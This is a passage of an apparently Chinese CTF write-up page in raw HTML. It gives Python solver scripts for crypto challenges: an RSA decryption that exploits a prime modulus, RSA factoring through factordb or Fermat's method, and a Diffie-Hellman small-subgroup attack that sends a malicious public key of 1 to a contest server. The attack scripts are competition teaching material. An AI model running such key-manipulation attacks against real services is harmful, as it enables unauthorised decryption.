(\\d+)&#x27;</span>, response_data)</span><br><span class=\"line\">            c_match = re.search(<span class=\"string\">r&#x27;c = ([\\da-f]+)&#x27;</span>, response_data)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (n_match <span class=\"keyword\">and</span> e_match <span class=\"keyword\">and</span> c_match):</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 无法解析 RSA 参数。&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">            n = <span class=\"built_in\">int</span>(n_match.group(<span class=\"number\">1</span>))</span><br><span class=\"line\">            e = <span class=\"built_in\">int</span>(e_match.group(<span class=\"number\">1</span>))</span><br><span class=\"line\">            c_hex = c_match.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n[*] 开始 RSA 解密...&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - n = <span class=\"subst\">&#123;<span class=\"built_in\">str</span>(n)[:<span class=\"number\">30</span>]&#125;</span>...&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - e = <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;    - c = <span class=\"subst\">&#123;c_hex[:<span class=\"number\">30</span>]&#125;</span>...&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># 漏洞利用: n 是素数, 所以 phi(n) = n - 1</span></span><br><span class=\"line\">            phi = n - <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 漏洞利用：n 是素数，phi(n) = n - 1&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 计算私钥 d</span></span><br><span class=\"line\">            d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, phi)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 私钥 d 计算成功&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 将小端序的十六进制 c 转换为整数</span></span><br><span class=\"line\">            c_bytes = <span class=\"built_in\">bytes</span>.fromhex(c_hex)</span><br><span class=\"line\">            c_int = <span class=\"built_in\">int</span>.from_bytes(c_bytes, <span class=\"string\">&#x27;little&#x27;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 解密消息 m</span></span><br><span class=\"line\">            m_int = <span class=\"built_in\">pow</span>(c_int, d, n)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 密文解密成功&quot;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\"># 转换回文本</span></span><br><span class=\"line\">            recovered_bytes = long_to_bytes(m_int)</span><br><span class=\"line\">            <span class=\"comment\"># 使用 &#x27;ignore&#x27; 忽略填充的随机字节可能导致的解码错误</span></span><br><span class=\"line\">            flag = recovered_bytes.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>, errors=<span class=\"string\">&#x27;ignore&#x27;</span>)</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 提取 flag 格式的部分</span></span><br><span class=\"line\">            flag_match = re.search(<span class=\"string\">r&#x27;(flag\\&#123;.*?\\&#125;)&#x27;</span>, flag)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> flag_match:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;✅ 成功找到 Flag: <span class=\"subst\">&#123;flag_match.group(<span class=\"number\">1</span>)&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;✅ 解密完成，原始文本: <span class=\"subst\">&#123;flag.strip()&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n[!] 发生错误: <span class=\"subst\">&#123;e&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>纯AI，第一段是接收POW的哈希挑战并暴力解密，得到<code>n,e,c</code>参数放入第二段<code>python</code>脚本里计算私钥，从而实现解密,得到flag。</p>\n<h2 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 给定的值</span></span><br><span class=\"line\">n = <span class=\"number\">5288062996177288067805240670327919739339874127477405321607402348589147491552053048231920112750216696782518281218048178087877077018108705271341382858124037</span></span><br><span class=\"line\">c = <span class=\"number\">2454797328903978848197140611862882439826920912955785083080835692389929572917351093371626343669582289242212514789420568997224614087740388703381025018563979</span></span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试分解n（512位的n可以被在线工具分解，或使用yafu等工具）</span></span><br><span class=\"line\"><span class=\"comment\"># 这里我们使用factordb或者其他分解方法</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 方法1: 使用在线factordb API</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">import</span> requests</span><br><span class=\"line\">    url = <span class=\"string\">f&quot;http://factordb.com/api?query=<span class=\"subst\">&#123;n&#125;</span>&quot;</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    data = response.json()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> data[<span class=\"string\">&#x27;status&#x27;</span>] == <span class=\"string\">&#x27;FF&#x27;</span>:  <span class=\"comment\"># 完全分解</span></span><br><span class=\"line\">        factors = data[<span class=\"string\">&#x27;factors&#x27;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(factors) == <span class=\"number\">2</span>:</span><br><span class=\"line\">            p = <span class=\"built_in\">int</span>(factors[<span class=\"number\">0</span>][<span class=\"number\">0</span>])</span><br><span class=\"line\">            q = <span class=\"built_in\">int</span>(factors[<span class=\"number\">1</span>][<span class=\"number\">0</span>])</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;成功分解n:&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;p = <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;q = <span class=\"subst\">&#123;q&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> ex:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;在线分解失败: <span class=\"subst\">&#123;ex&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;尝试本地分解...&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 方法2: 使用gmpy2进行小因子试除和Pollard&#x27;s rho</span></span><br><span class=\"line\">    <span class=\"comment\"># 对于512位的n，可能需要更强大的工具如yafu</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 先尝试小素数试除</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">trial_division</span>(<span class=\"params\">n, limit=<span class=\"number\">10000000</span></span>):</span><br><span class=\"line\">        i = <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> i * i &lt;= n <span class=\"keyword\">and</span> i &lt; limit:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> n % i == <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> i</span><br><span class=\"line\">            i += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    factor = trial_division(n)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> factor:</span><br><span class=\"line\">        p = factor</span><br><span class=\"line\">        q = n // p</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;找到因子: p = <span class=\"subst\">&#123;p&#125;</span>, q = <span class=\"subst\">&#123;q&#125;</span>&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 使用Fermat分解法（当p和q接近时效果好）</span></span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">fermat_factor</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">            a = gmpy2.isqrt(n)</span><br><span class=\"line\">            b2 = gmpy2.square(a) - n</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> gmpy2.is_square(b2):</span><br><span class=\"line\">                a += <span class=\"number\">1</span></span><br><span class=\"line\">                b2 = gmpy2.square(a) - n</span><br><span class=\"line\">            p = a + gmpy2.isqrt(b2)</span><br><span class=\"line\">            q = a - gmpy2.isqrt(b2)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"built_in\">int</span>(p), <span class=\"built_in\">int</span>(q)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            p, q = fermat_factor(n)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Fermat分解成功: p = <span class=\"subst\">&#123;p&#125;</span>, q = <span class=\"subst\">&#123;q&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;分解失败，需要使用更强大的分解工具（如yafu, msieve等）&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;或者在 factordb.com 网站上查询&quot;</span>)</span><br><span class=\"line\">            exit()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 验证分解是否正确</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> p * q == n:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n验证成功: p * q = n&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 计算欧拉函数</span></span><br><span class=\"line\">    phi = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 计算私钥d</span></span><br><span class=\"line\">    d = inverse(e, phi)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 解密</span></span><br><span class=\"line\">    m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 转换为字节</span></span><br><span class=\"line\">    flag = long_to_bytes(m)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;\\n解密结果:&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Flag: <span class=\"subst\">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;分解错误: p * q != n&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Diffie-Hellman\"><a href=\"#Diffie-Hellman\" class=\"headerlink\" title=\"Diffie-Hellman\"></a>Diffie-Hellman</h2><p>小子群攻击脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha256</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试导入 pwntools (可选)</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> remote</span><br><span class=\"line\">    PWNTOOLS_AVAILABLE = <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">    PWNTOOLS_AVAILABLE = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 尝试导入 Crypto 模块（支持多种安装方式）</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    <span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\">    <span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\">    <span class=\"keyword\">from</span> Crypto.Util.Padding <span class=\"keyword\">import</span> unpad</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 使用 pycryptodome&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">from</span> Cryptodome.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\">        <span class=\"keyword\">from</span> Cryptodome.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\">        <span class=\"keyword\">from</span> Cryptodome.Util.Padding <span class=\"keyword\">import</span> unpad</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+] 使用 pycryptodomex&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ImportError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[-] 错误：未找到加密库&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;请运行: pip uninstall crypto pycrypto pycryptodome -y&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;然后运行: pip install pycryptodome&quot;</span>)</span><br><span class=\"line\">        exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recv_until</span>(<span class=\"params\">sock, marker</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;接收数据直到遇到特定标记&quot;&quot;&quot;</span></span><br><span class=\"line\">    data = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    sock.settimeout(<span class=\"number\">10</span>)  <span class=\"comment\"># 设置超时</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> marker <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">            chunk = sock.recv(<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> chunk:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            data += chunk</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.timeout:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">recv_line</span>(<span class=\"params\">sock</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;接收一行数据&quot;&quot;&quot;</span></span><br><span class=\"line\">    data = <span class=\"string\">b&quot;&quot;</span></span><br><span class=\"line\">    sock.settimeout(<span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"string\">b&quot;\\n&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">            chunk = sock.recv(<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> chunk:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            data += chunk</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.timeout:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> data.strip()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit_manual</span>():</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    手动版本 - 只需要 socket 和 pycryptodome</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    host = <span class=\"string\">&quot;nc1.ctfplus.cn&quot;</span></span><br><span class=\"line\">    port = <span class=\"number\">34869</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 连接到服务器: &#123;&#125;:&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(host, port))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 创建 socket 连接</span></span><br><span class=\"line\">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    sock.settimeout(<span class=\"number\">15</span>)  <span class=\"comment\"># 设置总超时</span></span><br><span class=\"line\">    sock.connect((host, port))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Prime</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 接收 Prime...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;The Prime is &quot;</span>)</span><br><span class=\"line\">        p_line = recv_line(sock)</span><br><span class=\"line\">        p = <span class=\"built_in\">int</span>(p_line)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Prime (p): <span class=\"subst\">&#123;p&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Generator</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 接收 Generator...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;The Generator is &quot;</span>)</span><br><span class=\"line\">        g_line = recv_line(sock)</span><br><span class=\"line\">        g = <span class=\"built_in\">int</span>(g_line)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Generator (g): <span class=\"subst\">&#123;g&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收并解析 Alice&#x27;s Public Key</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 接收 Alice&#x27;s Public Key...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;Alice&#x27;s Public Key is &quot;</span>)</span><br><span class=\"line\">        a_line = recv_line(sock)</span><br><span class=\"line\">        A = <span class=\"built_in\">int</span>(a_line)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;[+] Alice&#x27;s Public Key (A): <span class=\"subst\">&#123;A&#125;</span>&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 发送恶意的 Bob&#x27;s Public Key = 1</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 等待输入提示...&quot;</span>)</span><br><span class=\"line\">        recv_until(sock, <span class=\"string\">b&quot;Bob&#x27;s Public Key:&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[*] 发送恶意 Bob&#x27;s Public Key: 1&quot;</span>)</span><br><span class=\"line\">        sock.send(<span class=\"string\">b&quot;1\\n&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 接收加密的 Flag</span></span><br><span 